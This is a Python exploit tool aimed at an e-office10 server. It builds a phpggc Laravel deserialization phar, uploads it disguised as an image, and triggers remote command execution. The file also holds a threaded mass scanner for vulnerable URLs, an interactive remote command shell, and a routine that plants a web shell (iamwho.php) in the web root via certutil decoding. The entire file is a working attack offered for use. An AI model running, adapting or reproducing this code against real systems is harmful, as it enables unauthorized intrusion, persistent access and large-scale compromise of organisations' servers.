from concurrent.futures import ThreadPoolExecutor, as_completed
from alive_progress import alive_bar
import requests
import subprocess
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning # type: ignore
from typing import Tuple, Optional, List
from rich.console import Console
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from libs.custom_print import custom_print
import base64
from time import sleep

class eoffice_auth_file_rce:
    def __init__(self, php_path:Optional[str]=None, url: Optional[str]=None,Proxy: Optional[str]=None) -> None:
        self.proxy = Proxy
        self.php_path = php_path
        self.url: Optional[str] = url
        self.session: requests.Session = requests.Session()
        self.session.proxies = {"http": self.proxy, "https": self.proxy}
        self.console: Console = Console()
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.reg = r'\}([^{}]+)$'
        self.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Connection': 'close',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        }
        self.location = {'source_path': '', 'desc_path': 'phar://../../../../attachment/'}
    

    def execute_command(self, cmd:str = "whoami", verbose: bool = True) -> str:
        result=0
        try:
            send_file_url = f"{self.url}/eoffice10/server/public/api/attachment/atuh-file"
            deserialization_url = f"{self.url}/eoffice10/server/public/api/attachment/path/migrate"
            get_result_url = f"{self.url}/eoffice10/server/public/api/empower/import"
            if verbose == True:
                exec = f"{self.php_path} -d phar.readonly=0 ./libs/phpggc/phpggc -p phar Laravel/RCE9 system '{cmd}' > cmd.phar"
                subprocess.run(exec, shell=True)
            send_file = self.session.post(send_file_url, files={'Filedata': ('register.inc', open('cmd.phar', 'rb'), 'image/jpeg')}, headers=self.headers, timeout=10)
            if send_file.status_code != 200:
                print(send_file.status_code)
                return False
            result_payload = {'file': send_file.json()["data"]["attachment_id"]}
            deserial = self.session.post(deserialization_url, data=self.location, headers=self.headers, timeout=10)
            get_result = self.session.post(get_result_url, data=result_payload, headers=self.headers, timeout=10)
            result:str = re.search(self.reg, get_result.text).group(1)
            if verbose:
                custom_print(
                    "Command executed successfully."
                    if result
                    else "Failed to execute command.",
                    "+" if result else "-",
                )
        except requests.exceptions.Timeout:
            if verbose:
                custom_print("Request timed out.", "-")
        except requests.exceptions.RequestException as e:
            if verbose:
                custom_print(f"Request failed: {e}", "-")
        except AttributeError as e:
            if verbose:
                custom_print(f"No results recieved. {e}", "*")
        except Exception as e:
            if verbose:
                custom_print(f"Critical error!", "!")
        return result


    def check_single_url(self, url) -> Tuple[str, bool]:
        self.url = url
        result: str = self.execute_command(verbose=False)
        is_vulnerable: bool = bool(result)
        if is_vulnerable == False:
            custom_print(f"{self.url} is not vulnerabled.", "-")
        elif is_vulnerable == True:
            custom_print(f"{self.url} is vulnerabled.", "+")
        else:
            custom_print("Unkown Error.", "!")
            exit()
        return f"{self.url} is vulnerable to E-Offce10-auth-file-RCE: {result}", is_vulnerable


    def interactive_shell(self) -> None:
        initial_result = self.execute_command()
        if initial_result:
            custom_print(
                f"{self.url} is vulnerable to E-office-auth-file-rce: {initial_result}", "!"
            )
            custom_print("Opening interactive shell...", "+")
            session: PromptSession = PromptSession(history=InMemoryHistory())
            while 1:
                try:
                    cmd: str = session.prompt(
                        HTML("<ansiyellow><b>cmd> </b></ansiyellow>"), default=""
                    ).strip()
                    if cmd.lower() == "exit":
                        break
                    elif cmd.lower() == "clear":
                        self.console.clear()
                        continue
                    output: str = self.execute_command(cmd)
                    if output:
                        print(f"{output}\n")
                except KeyboardInterrupt:
                    print("Exiting interactive shell...", "!")
                    break
        else:
            custom_print("System is not vulnerable or check failed.", "-")


    def check_urls_and_write_output(
            self, urls: List[str], output_path: Optional[str], max_workers: int = 20
    ) -> None:
        exec = f"{self.php_path} -d phar.readonly=0 ./phpggc/phpggc -p phar Laravel/RCE9 system 'whoami' > cmd.phar"
        subprocess.run(exec, shell=True)
        with ThreadPoolExecutor(max_workers=max_workers) as executor, alive_bar(
                len(urls), enrich_print=False
        ) as bar:
            futures = {executor.submit(self.check_single_url, url): url for url in urls}
            for future in as_completed(futures):
                result, is_vulnerable = future.result()
                if is_vulnerable:
                    custom_print(result, "+")
                    if output_path:
                        with open(output_path, "a") as file:
                            file.write(result)
                bar()

    def upload_webshell(self, localshell):
        try:
            with open(localshell, 'rb') as f:
                b64_encoded = str((base64.b64encode(f.read())))[2:-1]
            self.execute_command(f"echo {b64_encoded} > iamwho.txt")
            sleep(5)
            self.execute_command("certutil -decode iamwho.txt ../www/eoffice10/server/public/iamwho.php")
            print(f"Shell has been downloaded to{self.url}/eoffice10/server/public/iamwho.php")
        except Exception as e:
            print(f"Error Occured: {e}")
        


    
